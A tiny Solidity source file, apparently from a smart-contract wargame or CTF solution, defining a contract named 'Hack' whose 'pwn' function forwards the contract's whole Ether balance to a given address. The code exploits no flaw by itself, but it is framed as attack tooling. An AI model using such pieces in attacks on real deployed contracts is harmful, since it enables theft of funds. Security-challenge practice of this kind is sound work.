// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

contract Hack {
    function pwn(address payable _to) public payable {
        (bool success, ) = _to.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }
}
